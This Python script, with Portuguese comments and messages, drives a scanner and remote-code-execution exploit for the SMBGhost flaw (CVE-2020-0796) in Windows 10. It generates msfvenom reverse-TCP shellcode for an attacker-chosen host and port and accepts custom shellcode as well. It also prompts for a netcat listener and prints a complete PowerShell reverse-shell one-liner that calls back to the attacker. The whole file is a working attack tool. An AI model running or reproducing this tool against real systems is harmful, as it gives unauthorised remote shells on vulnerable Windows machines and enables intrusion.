#!/usr/bin/env python3

import binascii
import argparse
import subprocess
import base64
import readline

from Scanner.scanner import scanner_smb_ghost
from Scanner.logless_scanner import scanner_smb_ghost_silent
from RCE import exploit


# Exploit Title: Detecção e exploração de SMB Ghost
# Data: 06/05/2020
# Testado em: Microsoft Windows [versão 10.0.18362.113]. Construir 1903
# CVE: CVE-2020-0796
# Modificação e traduçao: NoiaRoot


class Color:
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    DARKCYAN = '\033[36m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'


banner = base64.b64decode(
    #"").decode()

print(Color.RED + Color.BOLD + "\n\n" + banner + Color.END)


def get_args():
    parser = argparse.ArgumentParser(description='Detecção e exploração de SMBGhost')
    parser.add_argument('-i', '--ip', dest='ip', type=str, required=True, help='IP address')
    parser.add_argument('-p', '--port', dest='port', type=int, default="445", help='SMB Port')
    parser.add_argument('--check', dest='check_vuln', action="store_true", default=False,
                        help='Verifique a vulnerabilidade do SMBGhost')
    parser.add_argument('-e', dest='exploit', action="store_true", default=False, help='Explorar diretamente o SMBGhost')
    parser.add_argument('--lhost', dest='lhost', type=str, help='Lhost para o invólucro reverso')
    parser.add_argument('--lport', dest='lport', type=str, help='Lport para o invólucro reverso')
    parser.add_argument('--arch', dest='arch', type=str, default="x64",
                        help='Arquitetura da máquina Windows de destino')
    parser.add_argument('--silent', dest='silent', action="store_true", default=False,
                        help='Modo silencioso para o scanner')  # I should remove this in the future
    parser.add_argument('--shellcode', dest='shellcode_menu', action="store_true", default=False,
                        help='Menu Shellcode para importar seu shell')
    parser.add_argument('--load-shellcode', dest='load_shellcode',
                        help='Carregue o shellcode diretamente do arquivo')
    return parser.parse_args()


def load_shellcode(filePath):
    try:
        with open(filePath, 'r') as shellcode_file:
            file_shellcode = shellcode_file.read()
            file_shellcode = file_shellcode.strip()
            #print ("SHELL CODE",file_shellcode)
    except:
        print((" [!] AVISO: caminho não encontrado"))
        return None

    if len(file_shellcode) == 0:
        print(" [!] AVISO: nenhum shellcode personalizado recuperado", )
        return None

    # verifique se o shellcode foi passado como formato de escape de string (retirado do código-fonte VEIL Souce code )
    if file_shellcode[0:2] == "\\x" and file_shellcode[4:6] == "\\x":
        file_shellcode = file_shellcode.replace("\\x", "")
        #print("SHELL 2 Ripped X", file_shellcode)
        return bytes.fromhex(file_shellcode)

    else:
        # caso contrário, codifique os dados brutos como uma string hexadecimal
        hexString = binascii.hexlify(file_shellcode)
        file_shellcode = "\\x" + "\\x".join([hexString[i:i + 2] for i in range(0, len(hexString), 2)])
        file_shellcode = file_shellcode.replace("\\x", "")
        #print("SHELL 3 Ripped X", file_shellcode)
        return bytes.fromhex(file_shellcode)


def menu_shellcode():

    print("Por favor escolha uma opção: \n")
    print('1: String de shellcode personalizada')
    print('2: Arquivo com shellcode (\\x41\\x42..)')
    print('3: Arquivo binário com shellcode\n')

    try:
        choose = int(input())
    except:
        print (Color.RED+"Escolha um número válido")
    if (choose == 2 or choose == 3):
        readline.set_completer_delims(' \t\n=')
        readline.parse_and_bind("guia: completa")
        filePath = input("Guia completa um arquivo: ")
        return load_shellcode(filePath)
    if (choose == 1):
        file_shellcode = input("Ppor favor insira o shellcode personalizado (uma linha, sem aspas, \\x00.. formato): ")
        file_shellcode = file_shellcode.replace("\\x", "")
        #print("SHELL Ripped X", file_shellcode)
        return bytes.fromhex(file_shellcode)
    if (choose != 1 or choose != 2 or choose != 3):
        print (Color.RED+"Você escolheu uma opção incorreta")



def generate_shellcode(lhost, lport, arch):
    print(Color.BLUE + "Gerando Shellcode %s com lhost %s e lport %s" % (arch, lhost, lport))

    if (arch == "x64"):
        msf_payload = "windows/x64/shell_reverse_tcp"
    else:
        msf_payload = "windows/shell_reverse_tcp"
    # generate the msfvenom command
    msf_command = 'msfvenom -p ' + msf_payload + ' '
    msf_command += "LHOST=" + lhost + " LPORT=" + str(lport)
    # add final part to command to narrow down the msf output
    msf_command += " -f hex"

    # Run the command and get output
    print("MSF command ->", msf_command)

    return bytes.fromhex((subprocess.check_output(msf_command, shell=True).decode('ascii')))

if __name__ == '__main__':
    args = get_args()
    lhost = args.lhost
    lport = args.lport
    print(Color.BLUE + "O alvo é %s:%s" % (args.ip, args.port))

    if (args.check_vuln):
        if (args.silent):
            if (scanner_smb_ghost_silent(args.ip, args.port)):
                print(Color.RED+"O host provavelmente está vulnerável")
        else:
            if (scanner_smb_ghost(args.ip, args.port)):
                print(Color.RED+"O host provavelmente está vulnerável")

    if (args.exploit):
        if (args.load_shellcode == None and args.shellcode_menu == False):
            if (lhost == None or lport == None):
                print(
                    Color.RED + "Parece que você esqueceu de colocar as opções LHOST, LPORT, ARCH. \n Deseja configurá-lo?")
                lhost = str(input("Entre no Lhost : "))
                lport = int(input("Entre no Lport : "))
                args.arch = str(input("Insira a arquitetura de destino (Default: x64) : ") or "x64")

            shell = generate_shellcode(lhost, lport, args.arch)

            if (shell != None):
                input(
                    Color.RED + "Por favor, abra sua sessão do netcat em uma nova aba antes de iniciar o exploit. pressione qualquer tecla para continuar \n nc -lvp %s" % lport)
                result = exploit.exploit_SMBGhost(args.ip, args.port, shell)
                result=0
                if (result == 0):
                    works = str(input ("A exploração funcionou?[Y/N] (Default: Y): ") or "Y")
                    if (works == "Y"):
                        print(Color.BLUE + "Exploração concluída. Aproveite seu shell reverso =) ")
                        print(
                            "\n DICA: você deve migrar para uma nova sessão, porque o SMB encerrará sua sessão atual em aproximadamente 10 minutos ~. \n POR EXEMPLO: \n ")
                        print(
                            Color.BLUE + "START /B powershell.exe -c \"$c = New-Object System.Net.Sockets.TCPClient('" + lhost + "'," + "'443'" + ");$str = $c.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $str.Read($b, 0, $b.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sendback = (iex $d 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sb = ([text.encoding]::ASCII).GetBytes($sendback2);$str.Write($sb,0,$sb.Length);$str.Flush()};$c.Close()\" \n")
                        print ("Mais exemplos em -> https://github.com/Hackplayers/ReverseShell")
                    else:
                        again = str(input("Quer iniciá-lo novamente?[Y/N] (Default: N) ") or "N")
                        if (again == "Y"):
                            print ("Lançando ataque pela segunda vez")
                            exploit.exploit_SMBGhost(args.ip, args.port, shell)
                else:
                    print(Color.RED + "Parece que há um problema ao gerar o shell")

        elif (args.load_shellcode != None and args.shellcode_menu == False):
            shell = load_shellcode(args.load_shellcode)
            if (shell != None):
                print(Color.BLUE + "Explorando com shellcode personalizado")
            result = exploit.exploit_SMBGhost(args.ip, args.port, shell)
            if (result == 0):
                print(Color.BLUE + "Exploração concluída. Aproveite seu shell reverso =)", result)
            else:
                print(Color.RED + "Problema ao acessar seu shellcode")

        elif (args.shellcode_menu == True):
            shell = menu_shellcode()
            if (shell != None):
                print(Color.BLUE + "Explorando com shellcode personalizado")
            result = exploit.exploit_SMBGhost(args.ip, args.port, shell)
            if (result == 0):
                print(Color.BLUE + "Exploração concluída. Aproveite seu shell reverso =)", result)
        else:
            print("Você colocou opções inválidas. O menu Shellcode é diferente de load_shellcode")
